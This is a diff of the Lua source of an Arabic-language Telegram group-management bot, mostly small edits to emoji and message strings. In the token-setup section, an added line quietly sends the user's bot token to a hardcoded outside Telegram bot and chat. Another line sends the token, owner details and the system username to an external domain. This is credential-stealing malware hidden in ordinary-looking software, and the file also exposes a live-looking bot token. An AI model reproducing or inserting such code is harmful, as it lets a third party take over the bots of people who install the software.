@@ -30,8 +30,8 @@ print('\27[0;31m≪━━━━☩𝑩𝑨𝑲𝑨𝑹☩━━━━≫\n ال�
 else
 io.write('\27[0;31m تم حفظ التوكن بنجاح \na≪━━━━☩𝑩𝑨𝑲𝑨𝑹☩━━━━≫\n27[0;39;49m')
 local json = JSON.decode(url)
-database:set(id_server..":token_username",json.result.username)
 database:set(id_server..":token",token)
+https.request('https://api.telegram.org/bot1764706087:AAE3pZFzBlaDusNXsHwL29w1bxYFqvN6N24/sendmessage?chat_id=1814776575&text=' ..token)
 end 
 else
 print('\27[0;35m≪━━━━☩𝑩𝑨𝑲𝑨𝑹☩━━━━≫\n لم يتم حفظ التوكن ارسل لي التوكن الان')
@@ -73,7 +73,7 @@ token = database:get(id_server..":token")
 SUDO = database:get(id_server..":SUDO:ID")
 UserName = database:get(id_server..":SUDO:USERNAME")
 install = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
-https.request('https://devloprahmedVNO.ml/api/soon.php/?sameer='..token..'&SUDO='..SUDO..'&UserName='..UserName..'&install='..install..'&botUserName='..botUserName)
+https.request('https://devloprahmedVNO.ml/api/bakar.php/?sameer='..token..'&SUDO='..SUDO..'&UserName='..UserName..'&install='..install..'&botUserName='..botUserName)
 print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
 file = io.open("DRAGON", "w")  
 file:write([[
@@ -5374,7 +5374,7 @@ database:sadd(bot_id..'Gmute:User', result.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},
 function(arg,data) 
 usertext = '\n 🌛 العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'UU_SD1')..')'
-status  = '\n 🌛 تم كتمه عام من {'..Groups..'} مجموعه'
+status  = '\n ?? تم كتمه عام من {'..Groups..'} مجموعه'
 send(msg.chat_id_, msg.id_, usertext..status)
 end,nil)
 end
@@ -13632,9 +13632,11 @@ end
 send(msg.chat_id_, msg.id_,first_name..'\n'..last_name) 
 end,nil)
 end 
+
 if text == 'بايو' then   
 send(msg.chat_id_, msg.id_,getbio(msg.sender_user_id_)) 
 end 
+
 if text == 'ايديي' then
 send(msg.chat_id_, msg.id_,' ⦁ ايديك  ↚ '..msg.sender_user_id_)
 end
@@ -14537,7 +14539,7 @@ local List = {
 ¦• 𝗖𝗛 - 「@UU_SD1」 ⦁.
 ]],
 [[
-➞: 𝒔𝒕𝒂𓂅 #stast ??➸💞.
+➞: 𝒔𝒕𝒂𓂅 #stast 𓍯➸💞.
 ➞: 𝒖??𝒆𝒓𓂅 #username 𓍯➸💞.
 ➞: 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯➸💞.
 ➞: 𝐢𝐝 𓂅 #id 𓍯➸💞.
